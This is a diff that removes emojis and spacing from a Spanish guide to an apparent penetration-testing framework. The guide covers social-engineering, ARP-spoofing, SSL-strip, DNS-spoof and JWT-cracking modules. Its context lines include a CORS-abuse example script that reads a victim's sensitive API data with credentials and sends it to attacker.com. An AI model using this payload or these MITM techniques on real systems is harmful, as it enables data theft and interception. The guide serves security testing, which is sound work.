@@ -1,6 +1,6 @@
 # KNDYS Framework v3.1 - Guía de Nuevos Módulos
 
-## 📧 Social Engineering - Módulos SET-Inspired
+## Social Engineering - Módulos SET-Inspired
 
 ### 1. mass_mailer - Campañas de Email Masivo
 
@@ -218,7 +218,7 @@ run
 
 ---
 
-## 🌐 Network Attacks
+## Network Attacks
 
 ### 1. arp_spoof - ARP Spoofing / MITM
 
@@ -249,9 +249,9 @@ sudo python3 tt
 
 **Módulos complementarios**:
 ```
-use network/packet_sniffer  # Capturar tráfico
-use network/ssl_strip       # Downgrade HTTPS
-use network/dns_spoof       # Redirigir dominios
+use network/packet_sniffer # Capturar tráfico
+use network/ssl_strip # Downgrade HTTPS
+use network/dns_spoof # Redirigir dominios
 ```
 
 ---
@@ -279,7 +279,7 @@ run
 - Bettercap
 - Scapy custom script
 
-**⚠️ Requiere**: ARP spoofing activo primero
+** Requiere**: ARP spoofing activo primero
 
 ---
 
@@ -349,12 +349,12 @@ run
 
 **Filtros BPF comunes**:
 ```
-tcp port 80                    # HTTP traffic
-tcp port 443                   # HTTPS traffic
-tcp port 21 or tcp port 22     # FTP/SSH
-udp port 53                    # DNS queries
-host 192.168.1.100             # Specific host
-net 192.168.1.0/24             # Entire network
+tcp port 80 # HTTP traffic
+tcp port 443 # HTTPS traffic
+tcp port 21 or tcp port 22 # FTP/SSH
+udp port 53 # DNS queries
+host 192.168.1.100 # Specific host
+net 192.168.1.0/24 # Entire network
 ```
 
 **Análisis de capturas**:
@@ -371,7 +371,7 @@ networkminer capture.pcap
 
 ---
 
-## 🔐 Web Application Testing
+## Web Application Testing
 
 ### 1. jwt_cracker - JWT Security Tester
 
@@ -461,9 +461,9 @@ run
 <!-- evil.com -->
 <script>
 fetch('https://victim.com/api/sensitive', {
-  credentials: 'include'
+ credentials: 'include'
 }).then(r => r.json())
-  .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))
+ .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))
 </script>
 ```
 
@@ -533,7 +533,7 @@ run
 
 ---
 
-## 🎯 Escenarios Prácticos Corporativos
+## Escenarios Prácticos Corporativos
 
 ### Scenario 1: Security Awareness Campaign
 
@@ -611,7 +611,7 @@ set url https://api.company.com
 
 ---
 
-## 📚 Referencias
+## Referencias
 
 ### Inspiración y Créditos
 - **SET (Social Engineering Toolkit)** by TrustedSec
@@ -632,5 +632,5 @@ set url https://api.company.com
 
 ---
 
-**KNDYS Framework v3.1**  
+**KNDYS Framework v3.1** 
 *Professional Penetration Testing*
